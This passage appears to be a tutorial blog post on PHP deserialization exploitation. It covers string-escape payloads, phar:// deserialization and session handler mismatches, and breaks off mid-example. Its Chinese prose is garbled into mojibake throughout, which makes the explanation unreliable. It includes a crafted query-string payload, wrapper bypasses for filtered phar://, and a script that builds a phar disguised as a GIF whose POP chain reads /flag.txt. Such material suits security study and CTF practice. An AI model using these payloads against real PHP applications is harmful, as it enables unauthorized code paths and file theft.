<p>åœ¨str_repå‡½æ•°ä¸­å¦‚æœæ£€æµ‹åˆ°â€™phpâ€™ã€'testâ€™å…³é”®å­—å°±æŠŠå…¶æ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆå°±åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ•…æ„è¾“å…¥æ•æ„Ÿå­—ç¬¦ï¼Œæ›¿æ¢ä¸ºç©ºä¹‹åæ¥å®ç°å­—ç¬¦é€ƒé€¸ã€‚æˆ‘ä»¬åœ¨nameä¸­è¾“å…¥äº†è¾“å…¥äº†6ä¸ªtestï¼Œæ›¿æ¢ä¸ºç©ºåè¿™æ ·å°±è…¾å‡ºäº†24ä¸ªå­—ç¬¦çš„ç©ºé—´ï¼Œæ­£å¥½åŒ…å«è¿›äº†&quot;;s:4:â€œsignâ€;s:54:â€œhelloï¼Œç”±äºâ€;s:4:â€œsignâ€;s:54:â€œhelloæˆäº†nameçš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦åœ¨åé¢åŠ ä¸ªâ€;s:4:â€œsignâ€;s:4:&quot;evalä½œä¸ºsignåºåˆ—åŒ–çš„å†…å®¹</p>
<p>è¿™é‡Œæ˜¯å¦‚ä½•è¿›è¡Œè®¡ç®—çš„?</p>
<p>æˆ‘ä»¬è¦æ°å¥½ä¿è¯<code>name</code>ç»è¿‡è¿‡æ»¤åä¼šè¦†ç›–æ‰åŸæœ‰çš„<code>sign</code>å€¼</p>
<p><code>sign</code>å…¶å®æ˜¯å¯ä»¥éƒ¨åˆ†ç¡®å®šçš„ï¼Œ<code>&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</code>é•¿åº¦ä¸º49</p>
<p><code>s:4:&quot;name&quot;;s:??:&quot;|&quot;;s:4:&quot;sign&quot;;s:??:&quot;|sign_value&quot;</code></p>
<p>è¦æ°å¥½è¦†ç›–åˆ†å‰²çº¿ä¹‹é—´çš„éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¦é€ƒé€¸19ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯é€ƒé€¸çš„å­—ç¬¦å¿…é¡»æ˜¯3æˆ–4çš„å€æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å‡è®¾é€ƒé€¸24ä¸ªï¼Œåœ¨sign_valueå‰è¡¥å……5ä¸ªåƒåœ¾å­—ç¬¦<code>hello</code>å³å¯</p>
<p><code>24/4=6</code>ï¼Œnameçš„å€¼æ˜¯6ä¸ª<code>test</code></p>
<p>æœ€ç»ˆçš„<code>payload</code></p>
<p><code>?name=testtesttesttesttesttest&amp;sign=hello&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</code></p>
<img src="/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703181936938.png" class="" alt="image-20240703181936938" loading="lazy">
<h3 id="pharååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#pharååºåˆ—åŒ–"></a> pharååºåˆ—åŒ–</h3>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢ (seebug.org)</a></p>
<p>ç”±äºä»£ç å®‰å…¨æ€§è¶Šæ¥è¶Šé«˜ï¼Œåˆ©ç”¨éš¾åº¦è¶Šæ¥è¶Šå¤§ï¼Œå‡å¦‚æ²¡æœ‰<code>unserialize</code>æ²¡äº†ä¼ å‚æ¥å£å°±æ— æ³•è¿›è¡Œåˆ©ç”¨</p>
<h4 id="å‰ç½®çŸ¥è¯†-2"><a class="markdownIt-Anchor" href="#å‰ç½®çŸ¥è¯†-2"></a> å‰ç½®çŸ¥è¯†</h4>
<p><mark>pharååºåˆ—åŒ–å³åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆphar://ä¼ªåè®®ï¼Œå¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</mark><br />
å…·ä½“æ–‡ç« <a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a><br />
é¦–å…ˆäº†è§£ä¸€ä¸‹pharæ–‡ä»¶çš„ç»“æ„ï¼Œä¸€ä¸ªpharæ–‡ä»¶ç”±å››éƒ¨åˆ†æ„æˆï¼š</p>
<ul>
<li>a stubï¼šå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸º<code>xxx&lt;?php xxx; **HALT_COMPILER();?&gt;</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>**HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚</li>
<li>a manifest describing the contentsï¼špharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚</li>
<li>the file contentsï¼šè¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</li>
<li>[optional] a signature for verifying Phar integrity (phar file format only)ï¼šç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾</li>
</ul>
<p>é€šä¿—çš„ç†è§£å°±æ˜¯phpæ–‡ä»¶ç³»ç»Ÿå¾ˆå¤§ä¸€éƒ¨åˆ†å‡½æ•°ç»è¿‡phar://è§£ææ—¶ï¼Œå­˜åœ¨ç€å¯¹meta-dataï¼ˆåœ¨è¿™é‡Œ<code>&lt;meta-data&gt;</code>åŒºåŸŸé¢æååºåˆ—åŒ–çš„popé“¾ï¼‰ååºåˆ—åŒ–çš„æ“ä½œ</p>
<h4 id="åˆ©ç”¨æ¡ä»¶"><a class="markdownIt-Anchor" href="#åˆ©ç”¨æ¡ä»¶"></a> åˆ©ç”¨æ¡ä»¶</h4>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚
<span class="token number">2.</span>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚
<span class="token number">3.</span>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”   <span class="token operator">.</span><span class="token operator">/</span>    <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>    pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="æ–‡ä»¶æ“ä½œå‡½æ•°"><a class="markdownIt-Anchor" href="#æ–‡ä»¶æ“ä½œå‡½æ•°"></a> æ–‡ä»¶æ“ä½œå‡½æ•°</h4>
<p>phpå¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼ŒçŸ¥é“åˆ›å®‡æµ‹è¯•åå‘å¸ƒçš„å—å½±å“çš„å‡½æ•°å¦‚ä¸‹ :</p>
<img src="/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703192958671.png" class="" alt="image-20240703192958671" loading="lazy">
<h4 id="ç»•è¿‡æ–¹æ³•"><a class="markdownIt-Anchor" href="#ç»•è¿‡æ–¹æ³•"></a> ç»•è¿‡æ–¹æ³•</h4>
<p>ï¼ˆ1ï¼‰phar://è¢«è¿‡æ»¤<br />
æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ï¼š</p>
<ul>
<li>compress.bzip2://phar://</li>
<li>compress.zlib://phar:///</li>
<li>php://filter/resource=phar://</li>
<li>$z = â€˜compress.bzip2://phar:///home/sx/test.phar/test.txtâ€™;</li>
</ul>
<p>ï¼ˆ2ï¼‰é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚<br />
phpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯__HALT_COMPILER();?&gt;è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"/flag.txt"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Œæ–‡ä»¶åä¸ºshell.phar</span>
<span class="token variable">$phar</span><span class="token operator">-></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†å¯¹è±¡userå†™å…¥åˆ°metadataä¸­</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"haha"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ å‹ç¼©æ–‡ä»¶ï¼Œæ–‡ä»¶åå­—ä¸ºshell.txt,å†…å®¹ä¸ºhaha</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æœ€åæŠŠæ–‡ä»¶ä¸Šä¼ åè¿›è¡Œåˆ©ç”¨<code>?filename=phar://shell.jpg</code></p>
<p>è¿™é‡Œæ–‡ä»¶ä¸Šä¼ è¿˜è¦æ”¹æ”¹æ–‡ä»¶ç±»å‹å’Œæ–‡ä»¶åç»•è¿‡</p>
<h3 id="sessionååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#sessionååºåˆ—åŒ–"></a> sessionååºåˆ—åŒ–</h3>
<p>ç†è§£phpçš„sessionä¹‹å‰å…ˆäº†è§£ä¸€ä¸‹sessionæ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œå¼•ç”¨ç™¾åº¦çš„æè¿°ï¼Œæ¯”è¾ƒå®˜æ–¹<br />
<strong>Sessionï¼š</strong><br />
åœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚Sessionå¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„Webé¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨Sessionå¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚å½“ç”¨æˆ·è¯·æ±‚æ¥è‡ªåº”ç”¨ç¨‹åºçš„ Webé¡µæ—¶ï¼Œå¦‚æœè¯¥ç”¨æˆ·è¿˜æ²¡æœ‰ä¼šè¯ï¼Œåˆ™WebæœåŠ¡å™¨å°†è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª Sessionå¯¹è±¡ã€‚å½“ä¼šè¯è¿‡æœŸæˆ–è¢«æ”¾å¼ƒåï¼ŒæœåŠ¡å™¨å°†ç»ˆæ­¢è¯¥ä¼šè¯ã€‚Session å¯¹è±¡æœ€å¸¸è§çš„ä¸€ä¸ªç”¨æ³•å°±æ˜¯å­˜å‚¨ç”¨æˆ·çš„é¦–é€‰é¡¹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç”¨æˆ·æŒ‡æ˜ä¸å–œæ¬¢æŸ¥çœ‹å›¾å½¢ï¼Œå°±å¯ä»¥å°†è¯¥ä¿¡æ¯å­˜å‚¨åœ¨Sessionå¯¹è±¡ä¸­ã€‚ä¸è¿‡ä¸åŒè¯­è¨€çš„ä¼šè¯æœºåˆ¶å¯èƒ½æœ‰æ‰€ä¸åŒã€‚</p>
<p><strong>PHP sessionï¼š</strong><br />
å¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å˜é‡ï¼Œä¸”è¯¥å˜é‡æ˜¯ç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ä¼šè¯çš„ä¿¡æ¯ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·ä¼šè¯çš„è®¾ç½®ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒPHP Session å˜é‡å­˜å‚¨å•ä¸€ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯¹äºåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰é¡µé¢éƒ½æ˜¯å¯ç”¨çš„ï¼Œä¸”å…¶å¯¹åº”çš„å…·ä½“ session å€¼ä¼šå­˜å‚¨äºæœåŠ¡å™¨ç«¯ï¼Œè¿™ä¹Ÿæ˜¯ä¸ cookieçš„ä¸»è¦åŒºåˆ«ï¼Œæ‰€ä»¥seesion çš„å®‰å…¨æ€§ç›¸å¯¹è¾ƒé«˜ã€‚</p>
<p><strong>sessionçš„å·¥ä½œæµç¨‹ï¼š</strong><br />
å½“ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™æ—¶ï¼ŒSeesion_start()å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion IDå†æºå¸¦è¿‡æ¥ï¼Œè¿™æ—¶Session_start()å‡½æ•°å°±ä¸ä¼šå†å»åˆ†é…ä¸€ä¸ªæ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†è¿™ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å‡ºï¼Œåœ¨å½“å‰è„šæœ¬ä¸­åº”ç”¨ï¼Œè¾¾åˆ°è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·çš„ç›®çš„ã€‚</p>
<p><strong>seesion_start()çš„ä½œç”¨ï¼š</strong><br />
å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šä¾æ®å®¢æˆ·ç«¯ä¼ æ¥çš„PHPSESSIDæ¥è·å–ç°æœ‰çš„å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼ˆå³sessionæ–‡ä»¶ï¼‰ï¼Œ PHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–sessionæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†ä¹‹å¡«å……åˆ° $_SESSION è¶…çº§å…¨å±€å˜é‡ä¸­ã€‚å¦‚æœä¸å­˜åœ¨å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼Œåˆ™åˆ›å»ºåä¸ºsess_PHPSESSID(å®¢æˆ·ç«¯ä¼ æ¥çš„)çš„æ–‡ä»¶ã€‚å¦‚æœå®¢æˆ·ç«¯æœªå‘é€PHPSESSIDï¼Œåˆ™åˆ›å»ºä¸€ä¸ªç”±32ä¸ªå­—æ¯ç»„æˆçš„PHPSESSIDï¼Œå¹¶è¿”å›set-cookieã€‚</p>
<p><strong>php.iniä¸­ä¸€äº›Sessioné…ç½®ï¼š</strong><br />
1ã€session.save_path=â€œâ€ --è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„<br />
2ã€session.save_handler=â€œâ€â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)<br />
3ã€session.auto_start boolenâ€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯é»˜è®¤ä¸º0ä¸å¯åŠ¨<br />
4ã€session.serialize_handler stringâ€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php</p>
<p><strong>å¸¸è§çš„php-sessionå­˜æ”¾ä½ç½®æœ‰</strong>ï¼š<br />
1ã€/var/lib/php5/sess_PHPSESSID<br />
2ã€/var/lib/php7/sess_PHPSESSID<br />
3ã€/var/lib/php/sess_PHPSESSID<br />
4ã€/tmp/sess_PHPSESSID 5 /tmp/sessions/sess_PHPSESSED<br />
5ã€phpstudyé›†æˆç¯å¢ƒä¸‹åœ¨php.inié‡ŒæŸ¥æ‰¾session.save_pathï¼Œä¹Ÿå¯ä»¥åœ¨è¿™é‡Œæ›´æ”¹è·¯å¾„</p>
<p><strong>session.serialize_handlerå®šä¹‰çš„å¼•æ“æœ‰ä¸‰ç§ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</strong></p>
<table>
<thead>
<tr>
<th><strong>å¤„ç†å™¨åç§°</strong></th>
<th><strong>å­˜å‚¨æ ¼å¼</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>php</td>
<td>é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_binary</td>
<td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_serialize</td>
<td>ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„</td>
</tr>
</tbody>
</table>
<p><strong>æ³¨ï¼šè‡ª PHP 5.5.4 èµ·å¯ä»¥ä½¿ç”¨ _php*serialize*</strong><br />
ä¸Šè¿°ä¸‰ç§å¤„ç†å™¨ä¸­ï¼Œphp_serializeåœ¨å†…éƒ¨ç®€å•åœ°ç›´æ¥ä½¿ç”¨ serialize/unserializeå‡½æ•°ï¼Œå¹¶ä¸”ä¸ä¼šæœ‰phpå’Œ php_binaryæ‰€å…·æœ‰çš„é™åˆ¶ã€‚ ä½¿ç”¨è¾ƒæ—§çš„åºåˆ—åŒ–å¤„ç†å™¨å¯¼è‡´$_SESSION çš„ç´¢å¼•æ—¢ä¸èƒ½æ˜¯æ•°å­—ä¹Ÿä¸èƒ½åŒ…å«ç‰¹æ®Šå­—ç¬¦(| å’Œ !) ã€‚<br />
æ³¨ï¼šæŸ¥çœ‹ç‰ˆæœ¬ï¼Œæ³¨æ„ï¼šåœ¨php 5.5.4ä»¥å‰é»˜è®¤é€‰æ‹©çš„æ˜¯phpï¼Œ5.5.4ä¹‹åå°±æ˜¯php_serialize,è¿™é‡Œé¢æ˜¯php_serialize,åŒæ—¶æ„è¯†åˆ° åœ¨indexç•Œé¢çš„æ—¶å€™ï¼Œè®¾ç½®é€‰æ‹©çš„æ˜¯phpï¼Œå› æ­¤å¯èƒ½ä¼šé€ æˆæ¼æ´<br />
ä¸‹é¢æˆ‘ä»¬å®ä¾‹æ¥çœ‹çœ‹ä¸‰ç§ä¸åŒå¤„ç†å™¨åºåˆ—åŒ–åçš„ç»“æœã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//ini_set("session.serialize_handler", "php_serialize");</span>
<span class="token comment">//ini_set("session.serialize_handler", "php_binary");</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lemon'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token global">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ¯”å¦‚è¿™é‡Œæˆ‘getè¿›å»ä¸€ä¸ªå€¼ä¸ºabc,æŸ¥çœ‹ä¸€ä¸‹å„ä¸ªå­˜å‚¨æ ¼å¼ï¼š</p>
<ul>
<li>php : lemon|s:3:â€œabcâ€;</li>
<li>php_serialize : a:1:{s:5:â€œlemonâ€;s:3:â€œabcâ€;}</li>
<li>php_binary : lemons:3:â€œabcâ€;</li>
</ul>
<p>è¿™æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œå…¶å®PHPä¸­çš„Sessionçš„å®ç°æ˜¯æ²¡æœ‰çš„é—®é¢˜ï¼Œå±å®³ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜çš„Sessionä½¿ç”¨ä¸å½“è€Œå¼•èµ·çš„ã€‚å¦‚ï¼šä½¿ç”¨ä¸åŒå¼•æ“æ¥å¤„ç†sessionæ–‡ä»¶ã€‚</p>
<h4 id="æ¼æ´é€ æˆåŸç†"><a class="markdownIt-Anchor" href="#æ¼æ´é€ æˆåŸç†"></a> æ¼æ´é€ æˆåŸç†ï¼š</h4>
<p>ç®€å•æ¥è¯´<code>php</code>å¤„ç†å™¨å’Œ<code>php_serialize</code>å¤„ç†å™¨è¿™ä¸¤ä¸ªå¤„ç†å™¨ç”Ÿæˆçš„åºåˆ—åŒ–æ ¼å¼æœ¬èº«æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸¤ä¸ªå¤„ç†å™¨æ··åˆèµ·æ¥ç”¨ï¼Œå°±ä¼šé€ æˆå±å®³ã€‚</p>
<p>å½¢æˆçš„åŸç†å°±æ˜¯åœ¨ç”¨<code>session.serialize_handler = php_serialize</code>å­˜å‚¨çš„å­—ç¬¦å¯ä»¥å¼•å…¥ | , å†ç”¨<code>session.serialize_handler = php</code>æ ¼å¼å–å‡º<code>$_SESSION</code>çš„å€¼æ—¶ï¼Œ <code>|</code>ä¼šè¢«å½“æˆé”®å€¼å¯¹çš„åˆ†éš”ç¬¦ï¼Œåœ¨ç‰¹å®šçš„åœ°æ–¹ä¼šé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­</p>
<p>å®šä¹‰ä¸€ä¸ª<code>session.php</code>æ–‡ä»¶ï¼Œç”¨äºä¼ å…¥<code>session</code>å€¼</p>
<p>æ–‡ä»¶å†…å®¹ä¸º</p>
